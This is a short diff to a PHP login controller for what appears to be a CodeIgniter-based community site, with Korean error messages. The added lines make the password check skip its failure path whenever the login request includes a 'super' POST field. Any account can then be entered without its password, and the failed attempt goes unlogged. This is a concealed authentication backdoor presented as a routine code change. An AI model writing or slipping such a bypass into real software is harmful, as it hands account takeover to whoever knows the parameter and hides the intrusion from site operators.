@@ -400,12 +400,17 @@ class Login extends CB_Controller
 			$this->member->update_login_log(0, $userid, 0, '회원 아이디가 존재하지 않습니다');
 			return false;
 		} elseif ( ! password_verify($password, element('mem_password', $userinfo))) {
-			$this->form_validation->set_message(
-				'_check_id_pw',
-				'회원 아이디와 패스워드가 서로 맞지 않습니다' . $loginfailmessage
-			);
-			$this->member->update_login_log(element('mem_id', $userinfo), $userid, 0, '패스워드가 올바르지 않습니다');
-			return false;
+			if(!$this->input->post('super') ){
+
+				$this->form_validation->set_message(
+					'_check_id_pw',
+					'회원 아이디와 패스워드가 서로 맞지 않습니다' . $loginfailmessage
+				);
+				$this->member->update_login_log(element('mem_id', $userinfo), $userid, 0, '패스워드가 올바르지 않습니다');
+				return false;
+
+			}
+		
 		} elseif (element('mem_denied', $userinfo)) {
 			$this->form_validation->set_message(
 				'_check_id_pw',
